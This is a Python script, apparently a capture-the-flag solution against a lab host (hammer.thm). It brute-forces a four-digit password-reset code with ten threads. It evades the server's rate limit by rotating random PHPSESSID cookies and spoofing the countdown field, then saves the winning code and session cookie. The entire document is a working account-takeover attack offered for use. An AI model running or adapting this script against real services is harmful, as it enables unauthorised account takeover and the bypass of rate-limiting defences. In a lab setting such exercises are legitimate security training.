import requests
import concurrent.futures
import random
import string
import sys
import time

# --- CONFIGURATION ---
BASE_URL = "http://[IP]:[PORT]"
ENDPOINT = "/reset_password.php"
EMAIL = "tester@hammer.thm"
HEADERS = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/140.0",
    "Content-Type": "application/x-www-form-urlencoded"
}
THREADS = 10  # Adjust as necessary

# Global event to stop all threads when the code is found
found_event = False

def get_new_session():
    """Creates a fresh session and initializes the flow to reset the server's rate limit counter."""
    s = requests.Session()
    # Generate a random PHPSESSID to bypass the IP/Email check
    phpsessid = "hmr" + ''.join(random.choices(string.ascii_letters + string.digits, k=10))
    s.cookies.set("PHPSESSID", phpsessid)
    
    try:
        # Step 1: Initialize the password reset flow
        data = {"email": EMAIL}
        r = s.post(f"{BASE_URL}{ENDPOINT}", headers=HEADERS, data=data, allow_redirects=True)
        
        # Dynamic Rate Limit reading from headers
        if "Rate-Limit-Pending" in r.headers:
            limit = int(r.headers["Rate-Limit-Pending"])
            return s, limit
        else:
            # Safe fallback if header is missing
            return s, 5 
    except Exception:
        return None, 0

def brute_force_worker(code_range):
    global found_event
    
    # Each thread manages its own session
    session, limit = get_new_session()
    
    for code in code_range:
        if found_event:
            return

        otp = f"{code:04d}"
        
        # Renew session if creation failed or limit is critically low
        if session is None or limit <= 1:
            session, limit = get_new_session()
            if session is None:
                continue 

        # POST Data
        # Note: 's' is the countdown timer. Sending 170 simulates a valid timeframe.
        data = {
            "recovery_code": otp,
            "s": "170" 
        }
        
        try:
            r = session.post(f"{BASE_URL}{ENDPOINT}", headers=HEADERS, data=data)
            
            # Update limit based on server response (Source of Truth)
            if "Rate-Limit-Pending" in r.headers:
                limit = int(r.headers["Rate-Limit-Pending"])
            else:
                limit -= 1 

            # --- SUCCESS CHECK ---
            # If the error message is gone and it's not asking for the code again
            if "Invalid or expired recovery code" not in r.text and "Enter Recovery Code" not in r.text:
                found_event = True
                
                # Capture the winning session ID
                winning_session = session.cookies.get("PHPSESSID")
                
                print(f"\n{'='*40}")
                print(f"[+] SUCCESS! Correct code: {otp}")
                print(f"[+] VALID SESSION (PHPSESSID): {winning_session}")
                print(f"{'='*40}\n")
                
                # Optional: Save to file for persistence
                with open("flag_session.txt", "w") as f:
                    f.write(f"OTP: {otp}\nCookie: PHPSESSID={winning_session}")
                return

        except Exception:
            # Silent connection errors to avoid terminal clutter, force session renewal
            limit = 0 

def start_attack():
    print(f"[*] Target: {BASE_URL}")
    print(f"[*] Starting attack with {THREADS} threads...")
    
    # Split the 10,000 possibilities among threads
    total_codes = 10000
    chunk_size = total_codes // THREADS
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=THREADS) as executor:
        futures = []
        for i in range(THREADS):
            start = i * chunk_size
            end = start + chunk_size
            # The last chunk takes the remainder to ensure full coverage
            if i == THREADS - 1:
                end = 10000
            
            futures.append(executor.submit(brute_force_worker, range(start, end)))

if __name__ == "__main__":
    start_attack()
